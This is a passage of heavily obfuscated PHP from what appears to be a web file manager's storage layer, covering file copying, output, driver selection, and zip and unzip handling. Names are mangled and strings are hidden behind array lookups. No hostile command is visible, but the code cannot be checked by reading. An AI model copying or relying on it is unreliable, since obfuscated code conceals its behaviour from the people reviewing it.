self::copyMoveKeepInfo($ˆÑôÙ›è, $›ßç, $¿ÓîÖ™é); return $¿ÓîÖ™é; } private static function copyMoveKeepInfo($¨†á¨„ë, $èÜş°ŸÇ, $ßı¶ûÓ²) { if (!$ßı¶ûÓ²) { return; } $ßİÉïÂ = $¨†á¨„ë->info($èÜş°ŸÇ); if (!is_array($ßİÉïÂ)) { return; } IO::setModifyTime($ßı¶ûÓ², $ßİÉïÂ[$_SERVER[÷ôÚîå][98]]); } public static function pathFather($†¤ÔŞ•) { $ª·Ã›¸à = IO::init($†¤ÔŞ•); $ÕÔë®Èã = $ª·Ã›¸à->pathFather($ª·Ã›¸à->path); return $ª·Ã›¸à->getPathOuter($ÕÔë®Èã); } public static function fileOut($ç„×Æ¹µ, $¡×ßÓ£à = false, $»®ì—Œß = false, $…ëòæÀè = '') { $¶û×Şîµ = self::driverMake($ç„×Æ¹µ); if ($¶û×Şîµ->isFileOutServer()) { return $¶û×Şîµ->fileOutServer($ç„×Æ¹µ, $¡×ßÓ£à, $»®ì—Œß, $…ëòæÀè); } return $¶û×Şîµ->fileOut($ç„×Æ¹µ, $¡×ßÓ£à, $»®ì—Œß, $…ëòæÀè); } public static function fileOutImage($½Ù¡ØÎœ, $Œ‘²Õ˜· = 250) { $ÃÚÑÖÎ³ = array(250, 600, 1200, 2000, 3000, 5000); for ($Óõ¾÷Š– = 0; $Óõ¾÷Š– < count($ÃÚÑÖÎ³); $Óõ¾÷Š–++) { if ($Óõ¾÷Š– == 0 && $Œ‘²Õ˜· <= $ÃÚÑÖÎ³[$Óõ¾÷Š–]) { $Œ‘²Õ˜· = $ÃÚÑÖÎ³[$Óõ¾÷Š–]; break; } else { if ($Œ‘²Õ˜· > $ÃÚÑÖÎ³[$Óõ¾÷Š– - 1] && $Œ‘²Õ˜· <= $ÃÚÑÖÎ³[$Óõ¾÷Š–]) { $Œ‘²Õ˜· = $ÃÚÑÖÎ³[$Óõ¾÷Š–]; break; } else { if ($Óõ¾÷Š– == count($ÃÚÑÖÎ³) - 1 && $Œ‘²Õ˜· > $ÃÚÑÖÎ³[$Óõ¾÷Š–]) { $Œ‘²Õ˜· = $ÃÚÑÖÎ³[$Óõ¾÷Š–]; break; } } } } $’Ñ‹ÑŒ = self::driverMake($½Ù¡ØÎœ); if ($’Ñ‹ÑŒ->isFileOutServer()) { return $’Ñ‹ÑŒ->fileOutImageServer($½Ù¡ØÎœ, $Œ‘²Õ˜·); } return $’Ñ‹ÑŒ->fileOutImage($½Ù¡ØÎœ, $Œ‘²Õ˜·); } private static function driverIsSame($ÚÁ¢… , $Ò‚×ßÆÑ) { $•ŒÃí“‡ =& $_SERVER[÷ôÚîå]; $à–Ã¬ÂÇ = $ÚÁ¢… ->getType(); $”Û²şşÆ = $Ò‚×ßÆÑ->getType(); if ($à–Ã¬ÂÇ != $”Û²şşÆ) { return !1; } if ($à–Ã¬ÂÇ == $•ŒÃí“‡[846]) { return !0; } if ($à–Ã¬ÂÇ == $•ŒÃí“‡[119]) { return !0; } if ($ÚÁ¢… ->pathDriver == $Ò‚×ßÆÑ->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ò«ôãÉ, $êÔÓ£¿¼) { $ƒ¶âÌÒ =& $_SERVER[÷ôÚîå]; if (!IO::exist($Ò«ôãÉ)) { return !1; } if (!IO::exist($êÔÓ£¿¼)) { IO::mkdir($êÔÓ£¿¼); } $‹é¾Óòê = array_to_keyvalue(self::listAllSimple($Ò«ôãÉ), $ƒ¶âÌÒ[97]); $ùï“‡£” = array_to_keyvalue(self::listAllSimple($êÔÓ£¿¼), $ƒ¶âÌÒ[97]); $¤Æñû‹² = array(); $Å†áŞ—© = array(); foreach ($‹é¾Óòê as $òèã¢Æ => $»†­Ñü) { if (isset($ùï“‡£”[$òèã¢Æ])) { if ($»†­Ñü[$ƒ¶âÌÒ[88]] == 1) { continue; } if ($ùï“‡£”[$òèã¢Æ][$ƒ¶âÌÒ[89]] == $»†­Ñü[$ƒ¶âÌÒ[89]]) { continue; } } if ($»†­Ñü[$ƒ¶âÌÒ[88]] == 1) { $Å†áŞ—©[] = $êÔÓ£¿¼ . $ƒ¶âÌÒ[8] . trim($òèã¢Æ, $ƒ¶âÌÒ[8]); continue; } $¥×º ¬Æ = strstr(trim($òèã¢Æ, $ƒ¶âÌÒ[8]), $ƒ¶âÌÒ[8]) ? get_path_father($òèã¢Æ) : $ƒ¶âÌÒ[12]; $¤Æñû‹²[] = array($ƒ¶âÌÒ[1252] => $»†­Ñü[$ƒ¶âÌÒ[99]], $ƒ¶âÌÒ[1253] => rtrim($êÔÓ£¿¼, $ƒ¶âÌÒ[8]) . $ƒ¶âÌÒ[8] . $¥×º ¬Æ, $ƒ¶âÌÒ[1254] => $»†­Ñü); } $ô‡±£± = array($ƒ¶âÌÒ[240] => $¤Æñû‹², $ƒ¶âÌÒ[88] => $Å†áŞ—©); Hook::trigger($ƒ¶âÌÒ[1255], $Ò«ôãÉ, $êÔÓ£¿¼, $ô‡±£±); foreach ($Å†áŞ—© as $»†­Ñü) { IO::mkdir($»†­Ñü); } foreach ($¤Æñû‹² as $»†­Ñü) { IO::copy($»†­Ñü[$ƒ¶âÌÒ[1252]], $»†­Ñü[$ƒ¶âÌÒ[1253]], REPEAT_REPLACE); } } public static function fileSubstr($•«Üé , $™È™™Éˆ, $Ç”ÛŒìÆ = false) { $ÇµÒ‰åï =& $_SERVER[÷ôÚîå]; $Ø¶´ƒõ† = self::driverMake($•«Üé ); $€Û„ñ™ô = $Ø¶´ƒõ†->size($•«Üé ); $şî”´¬ˆ = $™È™™Éˆ; $¨ÚæşÌä = $Ç”ÛŒìÆ; if ($™È™™Éˆ < 0) { $™È™™Éˆ = $€Û„ñ™ô + $™È™™Éˆ; } if ($Ç”ÛŒìÆ === !1) { $Ç”ÛŒìÆ = $€Û„ñ™ô - $™È™™Éˆ; } if ($™È™™Éˆ + $Ç”ÛŒìÆ > $€Û„ñ™ô) { $Ç”ÛŒìÆ = $€Û„ñ™ô - $™È™™Éˆ; } if (!$€Û„ñ™ô && $Ø¶´ƒõ†->getType() == $ÇµÒ‰åï[119] && !$Ø¶´ƒõ†->exist($•«Üé )) { $İ£Áæ€ = get_path_this($•«Üé ); $À¤²åš = parse_url_query($İ£Áæ€); if (is_array($À¤²åš) && isset($À¤²åš[$ÇµÒ‰åï[32]])) { $İ£Áæ€ = urldecode($À¤²åš[$ÇµÒ‰åï[32]]); } throw new Exception($ÇµÒ‰åï[1256] . LNG($ÇµÒ‰åï[1257]) . $ÇµÒ‰åï[1055] . clear_html($İ£Áæ€) . $ÇµÒ‰åï[12]); } if ($Ç”ÛŒìÆ <= 0) { return $ÇµÒ‰åï[12]; } if ($™È™™Éˆ < 0 || $™È™™Éˆ >= $€Û„ñ™ô || $Ç”ÛŒìÆ > 1024 * 1024 * 10) { throw new Exception("\146\151\154\145\x52\x65\x61\144\x20\x65\x72\x72\x6f\x72\x21\40\x73\x74\141\162\164\75{$™È™™Éˆ}\73\x6c\145\x6e\x67\x74\150\75{$Ç”ÛŒìÆ}\x3b\x20\x73\x69\172\x65\75{$€Û„ñ™ô}\73"); } $ñ¥èöÑÀ = $Ø¶´ƒõ†->fileSubstr($•«Üé , $™È™™Éˆ, $Ç”ÛŒìÆ); if (!$ñ¥èöÑÀ && $Ç”ÛŒìÆ && isset($GLOBALS[$ÇµÒ‰åï[1258]])) { throw new Exception($GLOBALS[$ÇµÒ‰åï[1258]][$ÇµÒ‰åï[1259]]); } return $ñ¥èöÑÀ; } private static function driverMake(&$éõßí¢â) { $·Úø‚ñì =& $_SERVER[÷ôÚîå]; $‹‡¯àç„ = KodIO::parse($éõßí¢â); if (!self::$driverListSystem) { $¡­·øÖí = Model($·Úø‚ñì[856])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¡­·øÖí, $·Úø‚ñì[484]); } if ($‹‡¯àç„[$·Úø‚ñì[33]] == KodIO::KOD_IO && !self::$driverListSystem[$‹‡¯àç„[$·Úø‚ñì[484]]]) { throw new Exception($·Úø‚ñì[1260]); return !1; } $éõßí¢â = $‹‡¯àç„[$·Úø‚ñì[1261]]; $ºà’Äˆ§ = self::driverGet($‹‡¯àç„, $éõßí¢â); return $ºà’Äˆ§; } private static function driverGet($ÓÇªåâ¡, &$¤İ°ş“) { $šİë£¼’ =& $_SERVER[÷ôÚîå]; $»ìÄé = $ÓÇªåâ¡[$šİë£¼’[1262]]; $ğ‰õ¸ = $ÓÇªåâ¡[$šİë£¼’[484]]; switch ($ÓÇªåâ¡[$šİë£¼’[33]]) { case KodIO::KOD_IO: $ø ªøš× = self::$driverListSystem[$ğ‰õ¸]; break; case KodIO::KOD_SOURCE: $¤İ°ş“ = $ğ‰õ¸ . $¤İ°ş“; $ø ªøš× = array($šİë£¼’[1263] => $šİë£¼’[1264], $šİë£¼’[6] => $ÓÇªåâ¡); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $‹÷÷™÷Ğ = $GLOBALS[$šİë£¼’[1265]]; self::$driverListUser = array_to_keyvalue($‹÷÷™÷Ğ, $šİë£¼’[484]); } $ø ªøš× = self::$driverListUser[$ğ‰õ¸]; break; case KodIO::KOD_SHARE_LINK: $ø ªøš× = array($šİë£¼’[1263] => $šİë£¼’[1266], $šİë£¼’[6] => $ÓÇªåâ¡); $Öõó­º = Action($šİë£¼’[1267])->sharePathInfo($ÓÇªåâ¡[$šİë£¼’[97]]); $¤İ°ş“ = $Öõó­º[$šİë£¼’[203]]; if (!$Öõó­º[$šİë£¼’[203]]) { $Ïòúç‡Ñ = Model($šİë£¼’[673])->getInfo($Öõó­º[$šİë£¼’[674]]); $¤İ°ş“ = KodIO::clear($Ïòúç‡Ñ[$šİë£¼’[1268]] . $ÓÇªåâ¡[$šİë£¼’[1261]]); $ÓÇªåâ¡[$šİë£¼’[569]] = $Ïòúç‡Ñ; $ÓÇªåâ¡[$šİë£¼’[1243]] = $¤İ°ş“; $ø ªøš× = array($šİë£¼’[1263] => $šİë£¼’[1269], $šİë£¼’[6] => $ÓÇªåâ¡); } break; case KodIO::KOD_SHARE_ITEM: $ø ªøš× = array($šİë£¼’[1263] => $šİë£¼’[1270], $šİë£¼’[6] => $ÓÇªåâ¡); $Ïòúç‡Ñ = Model($šİë£¼’[673])->getInfo($ÓÇªåâ¡[$šİë£¼’[484]]); if ($Ïòúç‡Ñ[$šİë£¼’[203]] == $šİë£¼’[238]) { $¤İ°ş“ = KodIO::clear($Ïòúç‡Ñ[$šİë£¼’[1268]] . $ÓÇªåâ¡[$šİë£¼’[1261]]); $ÓÇªåâ¡[$šİë£¼’[569]] = $Ïòúç‡Ñ; $ÓÇªåâ¡[$šİë£¼’[1243]] = $¤İ°ş“; $ø ªøš× = array($šİë£¼’[1263] => $šİë£¼’[1271], $šİë£¼’[6] => $ÓÇªåâ¡); } else { if (!$¤İ°ş“) { $¤İ°ş“ = $Ïòúç‡Ñ[$šİë£¼’[203]]; } } break; default: $¤İ°ş“ = $ÓÇªåâ¡[$šİë£¼’[97]]; $ø ªøš× = array($šİë£¼’[1263] => $šİë£¼’[1272]); break; } $¢ğû„À = $ÓÇªåâ¡[$šİë£¼’[97]]; if (!isset(self::$driverCache[$¢ğû„À])) { $¬§´‡ ± = strtolower($ø ªøš×[$šİë£¼’[108]]); $øø¢ÚüÄ = $GLOBALS[$šİë£¼’[6]][$šİë£¼’[102]][$šİë£¼’[915]]; $‹ëöİ® = $šİë£¼’[87] . (isset($øø¢ÚüÄ[$¬§´‡ ±]) ? $øø¢ÚüÄ[$¬§´‡ ±] : ucfirst($¬§´‡ ±)); if (!class_exists($‹ëöİ®)) { show_json("{$‹ëöİ®}\x20\156\157\164\40\x65\x78\151\163\164\163\x21", !1); } $¬Áœ¶´‰ = isset($ø ªøš×[$šİë£¼’[6]]) ? $ø ªøš×[$šİë£¼’[6]] : !1; self::$driverCache[$¢ğû„À] = new $‹ëöİ®($¬Áœ¶´‰); } $¼‡ºœø± = self::$driverCache[$¢ğû„À]; $¼‡ºœø±->pathDriver = $»ìÄé; $¼‡ºœø±->pathBase = $šİë£¼’[12]; if (isset($ø ªøš×[$šİë£¼’[6]][$šİë£¼’[1273]])) { $¼‡ºœø±->pathBase = rtrim($ø ªøš×[$šİë£¼’[6]][$šİë£¼’[1273]], $šİë£¼’[8]) . $šİë£¼’[8]; $¤İ°ş“ = $¼‡ºœø±->pathBase . ltrim($¤İ°ş“, $šİë£¼’[8]); } $¤İ°ş“ = $¼‡ºœø±->getPath($¤İ°ş“); if (isset($ÓÇªåâ¡[$šİë£¼’[1243]])) { $¤İ°ş“ = $ÓÇªåâ¡[$šİë£¼’[1243]]; } $¼‡ºœø±->path = $¤İ°ş“; return $¼‡ºœø±; } public static function errorTips($‚Ö¶ƒ¬± = false) { $«Èı·º =& $_SERVER[÷ôÚîå]; static $¸õî’Óâ = array(); $ğÌıÍ¤› = 1000; if ($‚Ö¶ƒ¬± === -1) { return $¸õî’Óâ ? $¸õî’Óâ[count($¸õî’Óâ) - 1] : $«Èı·º[12]; } if ($‚Ö¶ƒ¬± === !1) { return implode($«Èı·º[65], $¸õî’Óâ); } if (count($¸õî’Óâ) >= $ğÌıÍ¤›) { $¸õî’Óâ = array_slice($¸õî’Óâ, $ğÌıÍ¤› * 0.5, $ğÌıÍ¤›); } $¸õî’Óâ[] = $‚Ö¶ƒ¬±; write_log($«Èı·º[186] . ACTION . $«Èı·º[1274] . $‚Ö¶ƒ¬±, $«Èı·º[1275]); } public static function getLastError($è‡¼ì„ = '') { $ãúı™˜Š = self::errorTips(-1); return $ãúı™˜Š ? $ãúı™˜Š : $è‡¼ì„; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ªÖ¾µ±Ò; if ($ªÖ¾µ±Ò) { return $ªÖ¾µ±Ò; } $¢æ€ŒÄÂ = IO::init($_SERVER[÷ôÚîå][8]); return $¢æ€ŒÄÂ; } private static function iconvSystem($Æö†ó) { return self::local()->iconvSystem($Æö†ó); } private static function iconvApp($Øá«·ìğ) { return self::local()->iconvApp($Øá«·ìğ); } public static function zipFolder($ï€¾àÆª, $«¿á´ô = "\x7a\151\160", $Õ†É¶–Œ = '', $š¯€šÏŞ = REPEAT_RENAME) { $”–Üû˜à =& $_SERVER[÷ôÚîå]; $à·äŸ¾ö = IO::listPath($ï€¾àÆª); if (!$à·äŸ¾ö) { return !1; } $à·äŸ¾ö = array_merge($à·äŸ¾ö[$”–Üû˜à[95]], $à·äŸ¾ö[$”–Üû˜à[96]]); return self::zip($à·äŸ¾ö, $«¿á´ô, $Õ†É¶–Œ, $š¯€šÏŞ); } public static function zip($½‹¤¡’í, $¹åüô·™ = "\172\151\x70", $ïü¸îÔ = '', $‹àÄš‰ = REPEAT_RENAME) { $ÅŞ‹Š°º =& $_SERVER[÷ôÚîå]; if (is_string($½‹¤¡’í) && $½‹¤¡’í) { $½‹¤¡’í = array(array($ÅŞ‹Š°º[97] => $½‹¤¡’í)); } $åî·¤¡ = self::init($½‹¤¡’í[0][$ÅŞ‹Š°º[97]]); $´¾ÏœÌ = self::info($½‹¤¡’í[0][$ÅŞ‹Š°º[97]]); $·‚ Í¹Ç = $ÅŞ‹Š°º[12]; $˜¬¹Úâ = $ÅŞ‹Š°º[12]; $±†˜çÌ² = $ÅŞ‹Š°º[12]; if ($ïü¸îÔ && substr($ïü¸îÔ, -1, 1) != $ÅŞ‹Š°º[8]) { $˜¬¹Úâ = get_path_father($ïü¸îÔ); $±†˜çÌ² = get_path_this($ïü¸îÔ); } else { $˜¬¹Úâ = self::pathFather($´¾ÏœÌ[$ÅŞ‹Š°º[97]]); $±†˜çÌ² = $´¾ÏœÌ[$ÅŞ‹Š°º[32]] . $ÅŞ‹Š°º[10] . $¹åüô·™; if (count($½‹¤¡’í) > 1) { $Çµ¨ ¡¸ = IO::info($˜¬¹Úâ); $±†˜çÌ² = $Çµ¨ ¡¸[$ÅŞ‹Š°º[32]] . $ÅŞ‹Š°º[10] . $¹åüô·™; } if ($ïü¸îÔ) { $˜¬¹Úâ = $ïü¸îÔ; } } if ($åî·¤¡->getType() == $ÅŞ‹Š°º[119]) { $’¢ÂúÓí = self::init($˜¬¹Úâ); $ÕòÖğò = $’¢ÂúÓí->getType() == $ÅŞ‹Š°º[119] ? $˜¬¹Úâ : get_path_father($åî·¤¡->path); $ÕòÖğò = rtrim($ÕòÖğò, $ÅŞ‹Š°º[8]) . $ÅŞ‹Š°º[8]; mk_dir($ÕòÖğò); } else { $·‚ Í¹Ç = TEMP_FILES . $ÅŞ‹Š°º[1276] . time() . rand_string(8) . $ÅŞ‹Š°º[8]; mk_dir($·‚ Í¹Ç); file_put_contents($·‚ Í¹Ç . $ÅŞ‹Š°º[1277], $ÅŞ‹Š°º[12]); $ÕòÖğò = $·‚ Í¹Ç; } $µİº¥üÊ = IO::info($ÕòÖğò); if (!$µİº¥üÊ || !$µİº¥üÊ[$ÅŞ‹Š°º[243]]) { show_json(LNG($ÅŞ‹Š°º[1278]), !1); } $ŒÁÒØ¹ = self::zipFileList($½‹¤¡’í, $·‚ Í¹Ç); foreach ($ŒÁÒØ¹ as $Áß˜ç¼÷ => $¨­‘°ó®) { $ŒÁÒØ¹[$Áß˜ç¼÷] = self::iconvSystem($¨­‘°ó®); } $€éæ°§£ = get_filename_auto($ÕòÖğò . $±†˜çÌ², $ÅŞ‹Š°º[12], $‹àÄš‰); KodArchive::create(self::iconvSystem($€éæ°§£), $ŒÁÒØ¹); if (!IO::exist($€éæ°§£)) { if ($·‚ Í¹Ç) { del_dir($·‚ Í¹Ç); } write_log($ÅŞ‹Š°º[1279] . $€éæ°§£, $ÅŞ‹Š°º[398]); show_json(LNG($ÅŞ‹Š°º[1280]), !1); } if (!$·‚ Í¹Ç) { return $€éæ°§£; } $ƒÙ°Œı² = self::move($€éæ°§£, $˜¬¹Úâ, $‹àÄš‰); if ($·‚ Í¹Ç) { del_dir($·‚ Í¹Ç); } if (!$€éæ°§£) { write_log($ÅŞ‹Š°º[1281] . $€éæ°§£ . $ÅŞ‹Š°º[1282] . $˜¬¹Úâ, $ÅŞ‹Š°º[398]); show_json(LNG($ÅŞ‹Š°º[1280]), !1); } return $ƒÙ°Œı²; } public static function unzip($†èß’Ù¥, $ÍÚµ‡Œ“, $Îšº‚¹ğ = "\x2d\61", $ÅåÅÁÛ = "\x72\x65\160\x6c\x61\x63\x65") { $£Ï§õ± =& $_SERVER[÷ôÚîå]; $©ğôĞç¾ = parent::info($†èß’Ù¥); if (!$©ğôĞç¾) { show_json(LNG($£Ï§õ±[1283]), !1); } $êÏÕ¸» = IO::infoFullSimple($ÍÚµ‡Œ“); if (!$êÏÕ¸») { $ÍÚµ‡Œ“ = IO::mkdir($ÍÚµ‡Œ“); } if (isset($êÏÕ¸»[$£Ï§õ±[203]]) && trim($êÏÕ¸»[$£Ï§õ±[97]], $£Ï§õ±[8]) != trim($ÍÚµ‡Œ“, $£Ï§õ±[8])) { $ù‚»©Ø– = KodIO::make($êÏÕ¸»[$£Ï§õ±[202]]); $Í êö°¯ = IO::fileNameAuto($ù‚»©Ø–, $êÏÕ¸»[$£Ï§õ±[32]], REPEAT_RENAME_FOLDER, !0); $ÍÚµ‡Œ“ = IO::mkdir($ù‚»©Ø– . $Í êö°¯); } $Îšº‚¹ğ = $Îšº‚¹ğ && $Îšº‚¹ğ != $£Ï§õ±[1284] ? @json_decode($Îšº‚¹ğ, !0) : -1; $ô’£ËÚ = self::unzipPart($†èß’Ù¥, $Îšº‚¹ğ); if (!$ô’£ËÚ || !IO::exist($ô’£ËÚ[$£Ï§õ±[240]])) { show_json(LNG($£Ï§õ±[118]), !1); } $½¥Üà‘¬ = $ô’£ËÚ[$£Ï§õ±[1285]][count($ô’£ËÚ[$£Ï§õ±[1285]]) - 1]; if ($½¥Üà‘¬[$£Ï§õ±[1286]] == -1 || substr($½¥Üà‘¬[$£Ï§õ±[32]], -1, 1) == $£Ï§õ±[8]) { $ê¨Ë¯·ó = $ô’£ËÚ[$£Ï§õ±[1287]] . rand_string(10) . $£Ï§õ±[8]; mk_dir($ê¨Ë¯·ó); $’¶¹È§ = count($ô’£ËÚ[$£Ï§õ±[1285]]) == 1 ? IO::ext($†èß’Ù¥) : get_path_ext($ô’£ËÚ[$£Ï§õ±[240]]); $Ÿ÷¿åĞï = KodArchive::extract(self::iconvSystem($ô’£ËÚ[$£Ï§õ±[240]]), $ê¨Ë¯·ó, $½¥Üà‘¬[$£Ï§õ±[1286]], $Í êö°¯, $’¶¹È§); self::unzipErrorCheck($Ÿ÷¿åĞï, array($£Ï§õ±[1288], $†èß’Ù¥, $’¶¹È§, $ÍÚµ‡Œ“, $ô’£ËÚ)); Hook::trigger($£Ï§õ±[1289], $ê¨Ë¯·ó); recursion_dir($ê¨Ë¯·ó, $¸ÙÓé€ñ, $İ†âÛ·ì, 0); $¿æ‹Ú¾“ = array_merge($¸ÙÓé€ñ, $İ†âÛ·ì); $ÚªšĞ‡Ú = array(); foreach ($¿æ‹Ú¾“ as $Û¿‹™„) { $™Ê’‹Ü« = IO::move(self::iconvApp($Û¿‹™„), $ÍÚµ‡Œ“, $ÅåÅÁÛ); if ($™Ê’‹Ü«) { $ÚªšĞ‡Ú[] = $™Ê’‹Ü«; } } del_dir($ê¨Ë¯·ó); } else { $™Ê’‹Ü« = IO::move($ô’£ËÚ[$£Ï§õ±[240]], $ÍÚµ‡Œ“, $ÅåÅÁÛ, get_path_this($½¥Üà‘¬[$£Ï§õ±[32]])); if ($™Ê’‹Ü«) { $ÚªšĞ‡Ú[] = $™Ê’‹Ü«; } } return $ÚªšĞ‡Ú ? $ÚªšĞ‡Ú : !1; } public static function unzipList($¦¯¯ÀÎÙ) { $Ü²é”–• =& $_SERVER[÷ôÚîå]; $Í ÈÍ¡¤ = isset($¦¯¯ÀÎÙ[$Ü²é”–•[1290]]) ? $¦¯¯ÀÎÙ[$Ü²é”–•[1290]] : !1; $¨ßşò®£ = isset($¦¯¯ÀÎÙ[$Ü²é”–•[1286]]) ? @json_decode($¦¯¯ÀÎÙ[$Ü²é”–•[1286]], !0) : -1; $êá–ºñ‚ = self::unzipPart($¦¯¯ÀÎÙ[$Ü²é”–•[97]], $¨ßşò®£); if (!$êá–ºñ‚ || !IO::exist($êá–ºñ‚[$Ü²é”–•[240]])) { show_json(LNG($Ü²é”–•[118]), !1); } $‡Ëôà¦ = $êá–ºñ‚[$Ü²é”–•[1285]][count($êá–ºñ‚[$Ü²é”–•[1285]]) - 1]; $åİÑÁî¨ = in_array(IO::ext($êá–ºñ‚[$Ü²é”–•[240]]), array($Ü²é”–•[398], $Ü²é”–•[1291], $Ü²é”–•[1292], $Ü²é”–•[1293], $Ü²é”–•[1294], $Ü²é”–•[1295])); if (!$Í ÈÍ¡¤ && ($‡Ëôà¦[$Ü²é”–•[1286]] == -1 || $åİÑÁî¨)) { $Çö¾ÀòÕ = $êá–ºñ‚[$Ü²é”–•[1287]] . get_path_this($êá–ºñ‚[$Ü²é”–•[240]]) . $Ü²é”–•[1296]; if (!IO::exist($Çö¾ÀòÕ)) { $¹µÊ¿ì¯ = $‡Ëôà¦[$Ü²é”–•[1286]] == -1 ? get_path_ext(IO::pathThis($¦¯¯ÀÎÙ[$Ü²é”–•[97]])) : get_path_ext($êá–ºñ‚[$Ü²é”–•[240]]); $Ğ¾½æé = KodArchive::listContent(self::iconvSystem($êá–ºñ‚[$Ü²é”–•[240]]), !0, $¹µÊ¿ì¯); self::unzipErrorCheck($Ğ¾½æé, array($Ü²é”–•[1297], $¦¯¯ÀÎÙ, $êá–ºñ‚)); @file_put_contents($Çö¾ÀòÕ, json_encode($Ğ¾½æé[$Ü²é”–•[1298]])); } return @json_decode(IO::getContent($Çö¾ÀòÕ), !0); } IO::fileOut($êá–ºñ‚[$Ü²é”–•[240]], $Í ÈÍ¡¤, get_path_this($‡Ëôà¦[$Ü²é”–•[32]])); die; } private static function zipFileList($öõŠöœ‰, $ô£“¨¾‘ = false) { $¦¨ºü‚Ù =& $_SERVER[÷ôÚîå]; $µ†‡ğ¹ = array(); foreach ($öõŠöœ‰ as $öş‡¥¥è) { $Šªè’Öä = $öş‡¥¥è[$¦¨ºü‚Ù[97]]; if ($ô£“¨¾‘) { $Šªè’Öä = self::copy($öş‡¥¥è[$¦¨ºü‚Ù[97]], $ô£“¨¾‘, $¦¨ºü‚Ù[908]); } else { $ÁØ¸õïÁ = self::init($öş‡¥¥è[$¦¨ºü‚Ù[97]]); if ($ÁØ¸õïÁ->getType() == $¦¨ºü‚Ù[119]) { $Šªè’Öä = $ÁØ¸õïÁ->path; } } if ($Šªè’Öä && self::local()->exist($Šªè’Öä)) { $µ†‡ğ¹[$öş‡¥¥è[$¦¨ºü‚Ù[97]]] = $Šªè’Öä; } } if (!empty($µ†‡ğ¹)) { return array_values($µ†‡ğ¹); } show_json(LNG($¦¨ºü‚Ù[1257]), !1); } private static function localFilePath($ Áàì€´) { $ÃÎış =& $_SERVER[÷ôÚîå]; $ç™ì©Àè = KodIO::parse($ Áàì€´); if ($ç™ì©Àè[$ÃÎış[33]] == KodIO::KOD_SOURCE) { $§ì¿ë = Model($ÃÎış[914])->fileInfoGet(KodIO::sourceID($ Áàì€´)); if (!$§ì¿ë[$ÃÎış[97]]) { show_json($ÃÎış[1299], !1); } $ Áàì€´ = $§ì¿ë[$ÃÎış[97]]; } $Ë˜Œ‹œ = self::init($ Áàì€´); if ($Ë˜Œ‹œ->pathParse[$ÃÎış[1243]]) { $ Áàì€´ = $Ë˜Œ‹œ->pathParse[$ÃÎış[1243]]; $Ë˜Œ‹œ = self::init($ Áàì€´); } $àÓ¬õ— = $Ë˜Œ‹œ->getType(); if ($àÓ¬õ— == $ÃÎış[119] || $àÓ¬õ— == $ÃÎış[1300]) { if (!$Ë˜Œ‹œ->exist($Ë˜Œ‹œ->path)) { show_json(LNG($ÃÎış[118]), !1); } return $Ë˜Œ‹œ->path; } return !1; } public static function unzipPart($€ï³é˜í, $Ø¡¼§õ = -1) { $‡ØóÌÉ­ =& $_SERVER[÷ôÚîå]; $²Œ¢¤¤˜ = IO::pathThis($€ï³é˜í); if (!$Ø¡¼§õ || $Ø¡¼§õ == -1) { $ù£ÃŸÛè = array(array($‡ØóÌÉ­[32] => $²Œ¢¤¤˜, $‡ØóÌÉ­[1286] => -1)); $ù£ÃŸÛè[0][$‡ØóÌÉ­[1301]] = $ù£ÃŸÛè[0][$‡ØóÌÉ­[32]]; } else { if (is_array($Ø¡¼§õ)) { $ù£ÃŸÛè = $Ø¡¼§õ; $”©›¾åê = count($ù£ÃŸÛè) - 1; for ($šÔ»³¥Ï = 0; $šÔ»³¥Ï <= $”©›¾åê; $šÔ»³¥Ï++) { $†Ô™•°‡ = $ù£ÃŸÛè[$šÔ»³¥Ï]; $¤ùÈ‰¥¯ = get_path_this($†Ô™•°‡[$‡ØóÌÉ­[32]]) . (checkExtSafe($†Ô™•°‡[$‡ØóÌÉ­[32]]) ? $‡ØóÌÉ­[12] : $‡ØóÌÉ­[1302]); $ù£ÃŸÛè[$šÔ»³¥Ï][$‡ØóÌÉ­[1301]] = $‡ØóÌÉ­[1303] . intval($†Ô™•°‡[$‡ØóÌÉ­[1286]]) . $‡ØóÌÉ­[471] . $¤ùÈ‰¥¯; if ($šÔ»³¥Ï == 0) { continue; } $ù£ÃŸÛè[$šÔ»³¥Ï][$‡ØóÌÉ­[1301]] = $ù£ÃŸÛè[$šÔ»³¥Ï - 1][$‡ØóÌÉ­[1301]] . $‡ØóÌÉ­[1304] . $ù£ÃŸÛè[$šÔ»³¥Ï][$‡ØóÌÉ­[1301]]; } } } if (!is_array($ù£ÃŸÛè) || count($ù£ÃŸÛè) == 0) { return !1; } $»¯ƒ¿¥û = $ù£ÃŸÛè[count($ù£ÃŸÛè) - 1]; if (!IO::exist($€ï³é˜í)) { return !1; } $ÖÅ™§–ñ = TEMP_FILES . $‡ØóÌÉ­[1305] . kodIO::hashPathSafe($€ï³é˜í) . $‡ØóÌÉ­[8]; $Á×œ³ÀÑ = $ÖÅ™§–ñ . $»¯ƒ¿¥û[$‡ØóÌÉ­[1301]]; mk_dir($ÖÅ™§–ñ); file_put_contents(TEMP_FILES . $‡ØóÌÉ­[1277], $‡ØóÌÉ­[12]); if (IO::exist($Á×œ³ÀÑ)) { return array($‡ØóÌÉ­[240] => $Á×œ³ÀÑ, $‡ØóÌÉ­[1285] => $ù£ÃŸÛè, $‡ØóÌÉ­[1287] => $ÖÅ™§–ñ); } $÷ñÓà¡¶ = self::localFilePath($€ï³é˜í); if (!$÷ñÓà¡¶) { $÷ñÓà¡¶ = $ÖÅ™§–ñ . $‡ØóÌÉ­[1306]; if (!IO::exist($÷ñÓà¡¶)) { self::copy($€ï³é˜í, $ÖÅ™§–ñ, !1, get_path_this($÷ñÓà¡¶)); } } if (!$÷ñÓà¡¶ || !IO::exist($÷ñÓà¡¶)) { return !1; } if ($»¯ƒ¿¥û[$‡ØóÌÉ­[1286]] == -1) { return array($‡ØóÌÉ­[240] => $÷ñÓà¡¶, $‡ØóÌÉ­[1285] => $ù£ÃŸÛè, $‡ØóÌÉ­[1287] => $ÖÅ™§–ñ); } $®¹€¡¡¤ = $÷ñÓà¡¶; foreach ($ù£ÃŸÛè as $šÔ»³¥Ï => $†Ô™•°‡) { if (!$†Ô™•°‡ || $†Ô™•°‡[$‡ØóÌÉ­[1286]] == $‡ØóÌÉ­[1284]) { break; } if (substr($†Ô™•°‡[$‡ØóÌÉ­[32]], -1, 1) == $‡ØóÌÉ­[8]) { break; } $³À÷óü© = in_array(get_path_ext($†Ô™•°‡[$‡ØóÌÉ­[1301]]), 